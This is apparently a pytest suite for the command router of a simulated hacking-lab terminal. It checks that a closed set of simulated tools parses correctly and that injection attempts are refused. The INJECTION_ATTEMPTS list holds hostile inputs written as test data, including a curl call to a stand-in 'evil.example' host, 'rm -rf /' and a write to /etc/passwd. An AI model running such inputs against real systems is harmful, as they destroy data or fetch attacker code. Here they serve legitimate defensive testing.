"""Phase 2B verification: the controlled command router.

Covers parsing, the closed registry, dispatch, the handler contract, the
WebSocket integration, and the standing security boundary — that a command
line is matched against a table of simulated tools and is never executed.
"""

from __future__ import annotations

import asyncio
import pathlib
import tokenize

import pytest
from fastapi.testclient import TestClient

from app.commands import (
    CommandContext,
    CommandRegistry,
    CommandResult,
    CommandRouter,
    CommandSpec,
    CommandSyntaxError,
    ParsedCommand,
    TerminalAction,
    build_default_registry,
    default_registry,
    parse,
)
from app.commands import router as router_module
from app.main import app
from app.sessions import HackSession

COMMANDS_DIR = pathlib.Path(__file__).resolve().parent.parent / "app" / "commands"


@pytest.fixture
def context() -> CommandContext:
    return CommandContext(session=HackSession(session_id="test-session"))


@pytest.fixture
def router() -> CommandRouter:
    return CommandRouter(build_default_registry())


def run(router: CommandRouter, line: str, context: CommandContext) -> CommandResult:
    """Dispatch one line synchronously, for readable tests."""
    return asyncio.run(router.dispatch(line, context))


# --- 1-6: every registered command is recognised --------------------------

# The closed command set. Phase 2C added the two firmware commands the
# scenario needs; the network/MQTT tools carried over from Phase 2B, though
# their behaviour is now scenario-driven rather than stubbed.
REGISTERED = (
    "help",
    "clear",
    "nmap",
    "mosquitto_sub",
    "mosquitto_pub",
    "mqtt-explorer",
    "firmware-extract",
    "firmware-analyze",
)


@pytest.mark.parametrize("name", REGISTERED)
def test_registry_contains_the_phase_2b_command_set(name: str) -> None:
    assert name in default_registry
    assert default_registry.get(name) is not None


def test_registry_is_closed_to_everything_else() -> None:
    assert default_registry.names() == tuple(sorted(REGISTERED))


@pytest.mark.parametrize("name", REGISTERED)
def test_each_command_is_dispatched_to_its_handler(
    router: CommandRouter, context: CommandContext, name: str
) -> None:
    # Run with no arguments: proves the name resolves and a handler runs.
    # The exit code is not asserted here — a scenario command with no args
    # legitimately returns a usage/precondition failure (that is tested in
    # the Phase 2C suite); recognition is what this test is about.
    result = run(router, name, context)
    assert result.lines or result.actions  # it did something


def test_help_lists_every_registered_command(
    router: CommandRouter, context: CommandContext
) -> None:
    text = "\n".join(run(router, "help", context).lines)
    for name in REGISTERED:
        assert name in text


def test_clear_returns_a_terminal_action_not_blank_lines(
    router: CommandRouter, context: CommandContext
) -> None:
    result = run(router, "clear", context)
    assert result.actions == (TerminalAction.CLEAR,)
    assert result.lines == ()


# Phase 2C replaced the Phase 2B stub responses with scenario-driven output.
# The tool commands now produce real scenario behaviour, not "[stub] ..."
# placeholders; the behaviour itself is covered in tests/test_scenario_engine.py.
@pytest.mark.parametrize(
    "line",
    [
        "nmap 192.168.10.10",
        "mosquitto_sub -h 192.168.10.10 -t sensors/bme280/telemetry",
        "firmware-extract",
    ],
)
def test_tool_commands_are_scenario_driven_not_stubs(
    router: CommandRouter, context: CommandContext, line: str
) -> None:
    result = run(router, line, context)
    assert result.lines
    assert not any("[stub]" in line for line in result.lines)


# --- 7: unknown commands are refused safely -------------------------------


@pytest.mark.parametrize(
    "name", ["foo", "ls", "whoami", "NMAP", "help2", "mqtt_explorer"]
)
def test_unknown_command_is_refused(
    router: CommandRouter, context: CommandContext, name: str
) -> None:
    result = run(router, name, context)
    assert result.exit_code == router_module.EXIT_NOT_FOUND
    assert result.lines[0] == f"{name}: command not found"
    assert result.actions == ()


def test_unknown_command_name_is_truncated_before_being_echoed(
    router: CommandRouter, context: CommandContext
) -> None:
    """A very long token must not be reflected back in full."""
    result = run(router, "z" * 500, context)
    assert len(result.lines[0]) < 100
    assert result.lines[0].startswith("z" * router_module.MAX_ECHOED_NAME_CHARS + "...")


# --- 8: blank input -------------------------------------------------------


@pytest.mark.parametrize(
    "line", ["", "   ", "\t", "\r", "\n", "\r\n", "  \t  \r\n"]
)
def test_blank_input_produces_nothing(
    router: CommandRouter, context: CommandContext, line: str
) -> None:
    assert run(router, line, context) == CommandResult()


def test_parse_returns_none_for_blank_input() -> None:
    assert parse("") is None
    assert parse("   \r\n") is None


# --- 9: arguments are parsed correctly ------------------------------------


def test_parse_splits_name_and_arguments() -> None:
    command = parse("nmap -p 1883 192.168.4.1")
    assert command == ParsedCommand(
        name="nmap",
        args=("-p", "1883", "192.168.4.1"),
        raw="nmap -p 1883 192.168.4.1",
    )
    assert command.argv == ("nmap", "-p", "1883", "192.168.4.1")


def test_parse_collapses_whitespace_and_strips_the_trailing_enter() -> None:
    command = parse("  nmap   -sV \t 192.168.4.1  \r\n")
    assert command.name == "nmap"
    assert command.args == ("-sV", "192.168.4.1")
    assert command.raw == "  nmap   -sV \t 192.168.4.1  "


def test_parse_keeps_mqtt_wildcards_literal() -> None:
    """`#` and `+` are MQTT topic wildcards, not comments or operators."""
    command = parse("mosquitto_sub -t sensors/+/temp -t #")
    assert command.args == ("-t", "sensors/+/temp", "-t", "#")


def test_arguments_reach_the_handler(context: CommandContext) -> None:
    seen: list[ParsedCommand] = []

    def handle(command: ParsedCommand, ctx: CommandContext) -> CommandResult:
        seen.append(command)
        return CommandResult.text("ok")

    registry = CommandRegistry()
    registry.register(CommandSpec(name="probe", summary="s", handler=handle))

    run(CommandRouter(registry), "probe alpha beta", context)
    assert seen == [
        ParsedCommand(name="probe", args=("alpha", "beta"), raw="probe alpha beta")
    ]


# --- 10: quoted arguments -------------------------------------------------


@pytest.mark.parametrize(
    ("line", "args"),
    [
        ('mosquitto_pub -m "hello world"', ("-m", "hello world")),
        ("mosquitto_pub -m 'hello world'", ("-m", "hello world")),
        ('mosquitto_sub -t "home/#" -v', ("-t", "home/#", "-v")),
        ('mosquitto_pub -m ""', ("-m", "")),
        ('mosquitto_pub -m "it\'s"', ("-m", "it's")),
        ('mosquitto_pub -m a"b c"d', ("-m", "ab cd")),
    ],
)
def test_quoted_arguments_are_single_literal_tokens(
    line: str, args: tuple[str, ...]
) -> None:
    assert parse(line).args == args


@pytest.mark.parametrize(
    "line", ['nmap "unterminated', "nmap 'unterminated", "nmap \"a'b\"c'"]
)
def test_unbalanced_quotes_are_a_syntax_error(line: str) -> None:
    with pytest.raises(CommandSyntaxError):
        parse(line)


def test_quoting_does_not_smuggle_a_command_name() -> None:
    """A quoted name is still just a name, resolved against the registry."""
    assert parse('"nmap"').name == "nmap"
    assert parse('"ls"').name == "ls"


# --- 11 & 12: shell operators and injection attempts are inert ------------

INJECTION_ATTEMPTS = [
    "nmap 192.168.4.1 && whoami",
    "nmap 192.168.4.1 | whoami",
    "nmap 192.168.4.1; whoami",
    "nmap $(whoami)",
    "nmap `whoami`",
    "; whoami",
    "`whoami`",
    "help & help",
    "help > /etc/passwd",
    "help >> out.txt",
    "help < in.txt",
    "nmap $HOME",
    "nmap 192.168.4.1 || rm -rf /",
    "$(curl http://evil.example/x)",
    "help\nwhoami",
    "help; shutdown -h now",
]


@pytest.mark.parametrize("line", INJECTION_ATTEMPTS)
def test_shell_operators_are_a_syntax_error_not_syntax(line: str) -> None:
    with pytest.raises(CommandSyntaxError):
        parse(line)


@pytest.mark.parametrize("line", INJECTION_ATTEMPTS)
def test_injection_attempts_produce_controlled_output_only(
    router: CommandRouter, context: CommandContext, line: str
) -> None:
    result = run(router, line, context)
    assert result.exit_code == router_module.EXIT_USAGE
    assert len(result.lines) == 1
    assert result.lines[0].startswith("syntax error: ")
    # The student's payload is never reflected back into the terminal.
    for fragment in ("whoami", "curl", "rm -rf", "passwd", "shutdown"):
        assert fragment not in result.lines[0]


def test_injection_attempt_does_not_touch_the_filesystem(
    router: CommandRouter, context: CommandContext, tmp_path: pathlib.Path
) -> None:
    marker = tmp_path / "pwned.txt"
    run(router, f"help > {marker}", context)
    run(router, f"help && echo pwned > {marker}", context)
    assert not marker.exists()


@pytest.mark.parametrize(
    "line",
    [
        "help\x00",
        "help \x1b[31m",
        "\x1b]0;title\x07help",
        "help\x07",
        "help\x08\x08",
        'nmap "\x1b[2J"',
    ],
)
def test_control_characters_are_rejected(line: str) -> None:
    """Keeps ANSI escapes out of anything the router may echo back."""
    with pytest.raises(CommandSyntaxError):
        parse(line)


def test_quoted_operators_are_literal_data_not_syntax() -> None:
    """Quoting makes an operator ordinary text — and text never runs."""
    command = parse('mosquitto_pub -t t -m "a && b; c | d"')
    assert command.args == ("-t", "t", "-m", "a && b; c | d")


def test_oversized_input_is_refused(
    router: CommandRouter, context: CommandContext
) -> None:
    with pytest.raises(CommandSyntaxError):
        parse("nmap " + "a" * 2000)
    with pytest.raises(CommandSyntaxError):
        parse("nmap" + " a" * 200)

    result = run(router, "nmap " + "a" * 2000, context)
    assert result.exit_code == router_module.EXIT_USAGE
    assert result.lines == ("syntax error: command line is too long",)


# --- no execution primitives exist in the command layer -------------------

FORBIDDEN_NAMES = frozenset(
    {
        "subprocess",
        "os",
        "pty",
        "system",
        "popen",
        "spawn",
        "execl",
        "execv",
        "execve",
        "eval",
        "exec",
        "compile",
        "shell",
        "socket",
        "importlib",
        "__import__",
        "getattr",
    }
)

#: Modules the command layer must not reach for: importing any of them would
#: mean it had grown a transport, and it is meant to stay transport-agnostic.
FORBIDDEN_IMPORTS = frozenset(
    {"fastapi", "starlette", "websockets", "app.websocket"}
)


def _code_names(path: pathlib.Path) -> set[str]:
    """NAME tokens in a module, excluding comments and string literals."""
    names: set[str] = set()
    with tokenize.open(path) as handle:
        for token in tokenize.generate_tokens(handle.readline):
            if token.type == tokenize.NAME:
                names.add(token.string)
    return names


def _command_modules() -> list[pathlib.Path]:
    paths = sorted(COMMANDS_DIR.rglob("*.py"))
    assert paths, "no command modules found"
    return paths


def test_command_layer_has_no_execution_primitives() -> None:
    """The router is not a shell, and this fails if it ever becomes one."""
    offenders = [
        f"{path.relative_to(COMMANDS_DIR)}: {name}"
        for path in _command_modules()
        for name in sorted(_code_names(path) & FORBIDDEN_NAMES)
    ]
    assert offenders == [], f"execution primitive in command layer: {offenders}"


# --- 14: the router never touches the transport ---------------------------


def test_command_layer_does_not_import_the_transport() -> None:
    offenders = []
    for path in _command_modules():
        for line in path.read_text(encoding="utf-8").splitlines():
            stripped = line.strip()
            if not stripped.startswith(("import ", "from ")):
                continue
            offenders.extend(
                f"{path.name}: {stripped}"
                for forbidden in FORBIDDEN_IMPORTS
                if forbidden in stripped
            )
    assert offenders == [], f"transport import in command layer: {offenders}"


def test_dispatch_returns_a_result_and_writes_nothing(
    router: CommandRouter, context: CommandContext
) -> None:
    """Handlers hand back data; only the transport decides what to send."""
    result = run(router, "nmap", context)
    assert isinstance(result, CommandResult)
    assert isinstance(result.lines, tuple)
    assert isinstance(result.actions, tuple)


# --- 13: results are deterministic ----------------------------------------


@pytest.mark.parametrize("line", [*REGISTERED, "foo", "nmap -p 1883 192.168.4.1"])
def test_results_are_deterministic_across_fresh_sessions(line: str) -> None:
    # Same command from the same *starting* state gives the same result.
    # Fresh sessions are used because scenario commands are stateful (running
    # the same command twice on one session can legitimately differ, e.g.
    # firmware-extract then "already extracted"); determinism is a property of
    # equal starting state, which independent fresh sessions guarantee.
    router = CommandRouter(build_default_registry())
    first = CommandContext(session=HackSession(session_id="a"))
    second = CommandContext(session=HackSession(session_id="b"))
    assert run(router, line, first) == run(router, line, second)


# --- 15: session isolation ------------------------------------------------


def test_handlers_receive_their_own_caller_session() -> None:
    seen: list[str] = []

    def handle(command: ParsedCommand, ctx: CommandContext) -> CommandResult:
        seen.append(ctx.session.session_id)
        ctx.session.resize(120, 40)
        return CommandResult.text("ok")

    registry = CommandRegistry()
    registry.register(CommandSpec(name="probe", summary="s", handler=handle))
    router = CommandRouter(registry)

    first = CommandContext(session=HackSession(session_id="a"))
    second = CommandContext(session=HackSession(session_id="b"))

    run(router, "probe", first)
    assert seen == ["a"]
    assert (first.session.cols, first.session.rows) == (120, 40)
    # The other session is untouched: state lives on the session, never on
    # the handler, the registry, or the router.
    assert (second.session.cols, second.session.rows) == (80, 24)


# --- registry behaviour ---------------------------------------------------


def test_registry_refuses_duplicate_registration() -> None:
    registry = CommandRegistry()
    spec = CommandSpec(
        name="probe", summary="s", handler=lambda command, ctx: CommandResult()
    )
    registry.register(spec)
    with pytest.raises(ValueError):
        registry.register(spec)


def test_registries_are_independent() -> None:
    assert build_default_registry() is not default_registry
    assert build_default_registry().names() == default_registry.names()


# --- a failing handler is contained ---------------------------------------


def test_handler_exception_becomes_terminal_text(context: CommandContext) -> None:
    def handle(command: ParsedCommand, ctx: CommandContext) -> CommandResult:
        raise RuntimeError("secret internal detail: /srv/app/token=abc123")

    registry = CommandRegistry()
    registry.register(CommandSpec(name="boom", summary="s", handler=handle))

    result = run(CommandRouter(registry), "boom", context)
    assert result.exit_code == router_module.EXIT_FAILURE
    joined = " ".join(result.lines)
    assert "secret internal detail" not in joined
    assert "RuntimeError" not in joined
    assert "Traceback" not in joined


# --- 16: the WebSocket survives everything above --------------------------


@pytest.fixture
def client() -> TestClient:
    with TestClient(app) as test_client:
        yield test_client


def _open_session(ws) -> str:
    session_frame = ws.receive_json()
    assert session_frame["type"] == "session"
    assert ws.receive_json()["type"] == "output"
    return session_frame["session_id"]


def test_websocket_routes_a_command_and_returns_its_output(client: TestClient) -> None:
    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        # Scan the scenario's target; the scenario reports the open MQTT port.
        ws.send_json({"type": "input", "data": "nmap 192.168.10.10\r"})
        reply = ws.receive_json()
        assert reply["type"] == "output"
        assert "1883/tcp open" in reply["data"]
        assert reply["data"].endswith("\r\n")


def test_websocket_sends_a_clear_action_frame(client: TestClient) -> None:
    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        ws.send_json({"type": "input", "data": "clear\r"})
        assert ws.receive_json() == {"type": "action", "action": "clear"}


def test_websocket_reports_unknown_commands_as_output_not_protocol_errors(
    client: TestClient,
) -> None:
    """`foo: command not found` is terminal text; `error` means the protocol broke."""
    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        ws.send_json({"type": "input", "data": "foo\r"})
        reply = ws.receive_json()
        assert reply["type"] == "output"
        assert reply["data"].startswith("foo: command not found\r\n")


@pytest.mark.parametrize("line", INJECTION_ATTEMPTS)
def test_websocket_survives_injection_attempts(client: TestClient, line: str) -> None:
    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        ws.send_json({"type": "input", "data": line + "\r"})
        reply = ws.receive_json()
        assert reply["type"] == "output"
        assert reply["data"].startswith("syntax error: ")
        assert "whoami" not in reply["data"]

        # The session is still usable afterwards.
        ws.send_json({"type": "input", "data": "help\r"})
        assert ws.receive_json()["type"] == "output"


def test_websocket_session_stays_alive_across_mixed_traffic(client: TestClient) -> None:
    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)

        ws.send_text("not json")
        assert ws.receive_json()["type"] == "error"

        ws.send_json({"type": "input", "data": "\x00\r"})
        assert ws.receive_json()["type"] == "output"

        ws.send_json({"type": "input", "data": "z" * 3000})
        assert ws.receive_json()["type"] == "output"

        ws.send_json({"type": "input", "data": "help\r"})
        assert ws.receive_json()["type"] == "output"


def test_websocket_says_nothing_for_a_blank_line(client: TestClient) -> None:
    """A bare Enter draws a new prompt in the front end; the backend is silent."""
    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        ws.send_json({"type": "input", "data": "\r"})
        # No frame for the blank line, so the next command's output is next.
        ws.send_json({"type": "input", "data": "help\r"})
        reply = ws.receive_json()
        assert reply["type"] == "output"
        assert reply["data"].startswith("Available commands:")


def test_websocket_sessions_do_not_share_command_state(client: TestClient) -> None:
    with client.websocket_connect("/ws/hack") as first:
        first_id = _open_session(first)
        with client.websocket_connect("/ws/hack") as second:
            second_id = _open_session(second)
            assert first_id != second_id

            first.send_json({"type": "input", "data": "nmap\r"})
            second.send_json({"type": "input", "data": "help\r"})

            assert "nmap" in first.receive_json()["data"]
            assert "Available commands:" in second.receive_json()["data"]
